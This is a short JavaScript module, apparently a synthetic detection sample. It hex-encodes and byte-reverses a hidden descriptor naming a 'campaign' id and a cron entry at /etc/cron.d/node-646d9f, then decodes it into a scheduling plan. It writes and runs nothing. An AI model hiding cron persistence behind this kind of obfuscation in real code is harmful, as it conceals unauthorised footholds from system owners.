const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_07669298 = "\\x66\\x39\\x64\\x36\\x34\\x36\\x2d\\x65\\x64\\x6f\\x6e\\x2f\\x64\\x2e\\x6e\\x6f\\x72\\x63\\x2f\\x63\\x74\\x65\\x2f\\x3d\\x68\\x74\\x61\\x70\\x5f\\x65\\x6c\\x75\\x64\\x65\\x68\\x63\\x73\\x7c\\x31\\x46\\x46\\x39\\x44\\x36\\x34\\x36\\x2d\\x45\\x44\\x4f\\x4e\\x3d\\x64\\x69\\x5f\\x6e\\x67\\x69\\x61\\x70\\x6d\\x61\\x63\\x7c\\x31\\x3d\\x74\\x6e\\x75\\x6f\\x63\\x5f\\x65\\x67\\x61\\x74\\x73\\x7c\\x72\\x6f\\x74\\x70\\x69\\x72\\x63\\x73\\x65\\x64\\x5f\\x6e\\x6f\\x72\\x63\\x3d\\x72\\x65\\x74\\x70\\x61\\x64\\x61\\x7c\\x72\\x6f\\x74\\x70\\x69\\x72\\x63\\x73\\x65\\x64\\x5f\\x72\\x65\\x74\\x73\\x69\\x67\\x65\\x72\\x2c\\x65\\x6c\\x75\\x64\\x65\\x68\\x63\\x73\\x5f\\x64\\x6c\\x69\\x75\\x62\\x3d\\x73\\x70\\x65\\x74\\x73\\x7c\\x31\\x3d\\x76";

const Codec_07669298 = "escaped_octets|reverse_bytes|";



function load_07669298() { return [...Material_07669298.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_07669298(EnCoDeD) { return [...EnCoDeD].reverse(); }

async function recover_07669298() {

  const NeUtRaL = "";

  const EnCoDeD = load_07669298(); let DeCoDeD = [];

  switch (1) { case 1: DeCoDeD = decode_07669298(EnCoDeD); break; default: throw new Error("state"); }

  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");

}

async function inspect_07669298() { return Buffer.from(await recover_07669298(), "utf8").toString("utf8"); }

async function plan_07669298() { const inspect = inspect_07669298; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "cron_descriptor", path: fields.schedule_path }); }

void moduleShape; void plan_07669298;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_07669298());

